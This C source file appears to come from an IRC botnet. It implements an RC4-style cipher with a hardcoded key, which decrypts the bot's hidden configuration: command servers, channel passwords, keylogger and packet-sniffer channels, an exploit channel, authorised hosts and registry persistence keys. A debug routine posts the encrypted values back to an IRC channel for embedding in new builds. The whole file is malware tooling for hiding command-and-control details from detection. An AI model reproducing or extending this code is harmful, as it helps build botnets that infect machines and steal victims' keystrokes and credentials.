#include "includes.h"
#include "functions.h"
#include "externs.h"

void Crypt(unsigned char *inp, DWORD inplen, unsigned char *key, DWORD keylen)
{

	unsigned char Sbox[257], Sbox2[257], temp = 0 , k = 0;
	unsigned long i=0, j=0, t=0, x=0;

	keylen = 0;

	
	unsigned char OurUnSecuredKey[49];
	OurUnSecuredKey[0]=10; OurUnSecuredKey[1]=14; OurUnSecuredKey[2]=32; OurUnSecuredKey[3]=72;
	OurUnSecuredKey[4]=11; OurUnSecuredKey[5]=43; OurUnSecuredKey[6]=12; OurUnSecuredKey[7]=35;
	OurUnSecuredKey[8]=58; OurUnSecuredKey[9]=39; OurUnSecuredKey[10]=40; OurUnSecuredKey[11]=94;
	OurUnSecuredKey[12]=42; OurUnSecuredKey[13]=30; OurUnSecuredKey[14]=45; OurUnSecuredKey[15]=90;
	OurUnSecuredKey[16]=27; OurUnSecuredKey[17]=15; OurUnSecuredKey[18]=76; OurUnSecuredKey[19]=68;
	OurUnSecuredKey[20]=22; OurUnSecuredKey[21]=04; OurUnSecuredKey[22]=87; OurUnSecuredKey[23]=35;
	OurUnSecuredKey[24]=17; OurUnSecuredKey[25]=83; OurUnSecuredKey[26]=56; OurUnSecuredKey[27]=19;
	OurUnSecuredKey[28]=13; OurUnSecuredKey[29]=18; OurUnSecuredKey[30]=37; OurUnSecuredKey[31]=28;
	OurUnSecuredKey[32]=48; OurUnSecuredKey[33]=18; OurUnSecuredKey[34]=80; OurUnSecuredKey[35]=79;
	OurUnSecuredKey[36]=57; OurUnSecuredKey[37]=16; OurUnSecuredKey[38]=66; OurUnSecuredKey[39]=31;
	OurUnSecuredKey[40]=55; OurUnSecuredKey[41]=29; OurUnSecuredKey[42]=65; OurUnSecuredKey[43]=85;
	OurUnSecuredKey[44]=44; OurUnSecuredKey[45]=65; OurUnSecuredKey[46]=44; OurUnSecuredKey[47]=88;
	OurUnSecuredKey[48]=0;
	    
	unsigned int OurKeyLen = strlen((char *)OurUnSecuredKey);  

    
	ZeroMemory(Sbox, sizeof(Sbox));
	ZeroMemory(Sbox2, sizeof(Sbox2));

    
	for(i = 0; i < 256U; i++)
		Sbox[i] = (unsigned char)i;

    
	if(keylen) {
		
		for(i = 0; i < 256U ; i++) {
			if(j == keylen)
				j = 0;
			Sbox2[i] = key[j++];
		}    
	} else {
		
		for(i = 0; i < 256U ; i++) {
			if(j == (unsigned long)OurKeyLen)
				j = 0;
			Sbox2[i] = OurUnSecuredKey[j++];
		}
	}

	j = 0 ; 

	for(i = 0; i < 256; i++) {
		j = (j + (unsigned long) Sbox[i] + (unsigned long) Sbox2[i]) % 256U ;
		temp =  Sbox[i];                    
		Sbox[i] = Sbox[j];
		Sbox[j] =  temp;
	}

	i = j = 0;
	for(x = 0; x < inplen; x++) {
		
		i = (i + 1U) % 256U;
		
		j = (j + (unsigned long) Sbox[i]) % 256U;


		temp = Sbox[i];
		Sbox[i] = Sbox[j] ;
		Sbox[j] = temp;

		t = ((unsigned long) Sbox[i] + (unsigned long) Sbox[j]) %  256U ;

		k = Sbox[t];

		inp[x] = (unsigned char)(inp[x] ^ k);
	}    

	return;
}

#ifndef NO_CRYPT 
void decryptstrings(int authsize, int versionsize)
{
	int i;

	Crypt((unsigned char *)botid,strlen(botid),NULL,0);
	Crypt((unsigned char *)version,strlen(version),NULL,0);
	Crypt((unsigned char *)server,strlen(server),NULL,0);
	Crypt((unsigned char *)serverpass,strlen(serverpass),NULL,0);
	Crypt((unsigned char *)channel,strlen(channel),NULL,0);
	Crypt((unsigned char *)chanpass,strlen(chanpass),NULL,0);
	Crypt((unsigned char *)server2,strlen(server2),NULL,0);
	Crypt((unsigned char *)channel2,strlen(channel2),NULL,0);
	Crypt((unsigned char *)chanpass2,strlen(chanpass2),NULL,0);
	Crypt((unsigned char *)filename,strlen(filename),NULL,0);
	Crypt((unsigned char *)keylogfile,strlen(keylogfile),NULL,0);
	Crypt((unsigned char *)valuename,strlen(valuename),NULL,0);
	Crypt((unsigned char *)nickconst,strlen(nickconst),NULL,0);
	Crypt((unsigned char *)modeonconn,strlen(modeonconn),NULL,0);
	Crypt((unsigned char *)chanmode,strlen(chanmode),NULL,0);
	Crypt((unsigned char *)exploitchan,strlen(exploitchan),NULL,0);
	Crypt((unsigned char *)keylogchan,strlen(keylogchan),NULL,0);
	Crypt((unsigned char *)psniffchan,strlen(psniffchan),NULL,0);

	for(i=0;i < authsize;i++)
		Crypt((unsigned char *)authost[i],strlen(authost[i]),NULL,0);

	for(i=0;i < versionsize;i++)
		Crypt((unsigned char *)versionlist[i],strlen(versionlist[i]),NULL,0);

	Crypt((unsigned char *)regkey1,strlen(regkey1),NULL,0); 
	Crypt((unsigned char *)regkey2,strlen(regkey2),NULL,0); 
	Crypt((unsigned char *)regkey3,strlen(regkey3),NULL,0); 
	Crypt((unsigned char *)regkey4,strlen(regkey4),NULL,0);

	return;
};
#endif

#ifdef DUMP_ENCRYPT
void encryptstring(char *str, char *varname, SOCKET sock, char *chan, BOOL notice)
{
	char buffer[IRCLINE];
	unsigned int counter=0;
	memset(buffer,0,sizeof(buffer));

	unsigned int str_len = strlen(str);

	Crypt((unsigned char *)str, strlen(str),NULL,0);

	sprintf(buffer,"char %s[]=\"",varname);
	for (unsigned int i=0; i < str_len; i++) {
		char tmpbuf[12];
		_snprintf(tmpbuf,sizeof(tmpbuf),"\\x%2.2X", (unsigned char)str[i]);
		counter+=strlen(tmpbuf);
		if (counter >= (IRCLINE-20)) {
			irc_privmsg(sock,chan,buffer,notice);
			memset(buffer,0,sizeof(buffer));	
			counter = 0;
		} 
		strncat(buffer,tmpbuf,strlen(tmpbuf));
	}
	strcat(buffer,"\";");
	irc_privmsg(sock,chan,buffer,notice, TRUE);

	
	Crypt((unsigned char *)str, strlen(str),NULL,0);

	return;
}

void encryptstrings(int authsize, int versionsize, SOCKET sock, char *chan, BOOL notice)
{
	char buffer[IRCLINE], sendbuf[IRCLINE];
	int i;
	
	encryptstring(botid,"botid",sock,chan,notice);
	encryptstring(version,"version",sock,chan,notice);
	encryptstring(password,"password",sock,chan,notice);	
	encryptstring(server,"server",sock,chan,notice);
	encryptstring(serverpass,"serverpass",sock,chan,notice);
	encryptstring(channel,"channel",sock,chan,notice);
	encryptstring(chanpass,"chanpass",sock,chan,notice);
	encryptstring(server2,"server2",sock,chan,notice);
	encryptstring(channel2,"channel2",sock,chan,notice);
	encryptstring(chanpass2,"chanpass2",sock,chan,notice);
	encryptstring(filename,"filename",sock,chan,notice);
	encryptstring(keylogfile,"keylogfile",sock,chan,notice);
	encryptstring(valuename,"valuename",sock,chan,notice);
	encryptstring(nickconst,"nickconst",sock,chan,notice);
	encryptstring(modeonconn,"modeonconn",sock,chan,notice);
	encryptstring(chanmode,"chanmode",sock,chan,notice);
	encryptstring(exploitchan,"exploitchan",sock,chan,notice);
	encryptstring(keylogchan,"keylogchan",sock,chan,notice);
	encryptstring(psniffchan,"psniffchan",sock,chan,notice);

	memset(buffer,0,sizeof(buffer));
	sprintf(buffer,"char *authost[]={");
	for(i=0;i < authsize;i++) {
		sprintf(sendbuf,"authost%d",i+1);
		encryptstring(authost[i],sendbuf,sock,chan,notice);
		strcat(buffer,sendbuf);strcat(buffer,",");
	}
	buffer[(strlen(buffer)-1)]='\0';
	strcat(buffer,"};");
	irc_privmsg(sock,chan,buffer,notice);

	memset(buffer,0,sizeof(buffer));
	sprintf(buffer,"char *versionlist[]={");
	for(i=0;i < versionsize;i++) {
		sprintf(sendbuf,"versionlist%d",i+1);
		encryptstring(versionlist[i],sendbuf,sock,chan,notice);
		strcat(buffer,sendbuf);strcat(buffer,",");
	}
	buffer[(strlen(buffer)-1)]='\0';
	strcat(buffer,"};");
	irc_privmsg(sock,chan,buffer,notice);

	encryptstring(regkey1,"regkey1",sock,chan,notice);
	encryptstring(regkey2,"regkey2",sock,chan,notice);
	encryptstring(regkey3,"regkey3",sock,chan,notice);
	encryptstring(regkey4,"regkey4",sock,chan,notice);

	return;
};
#endif
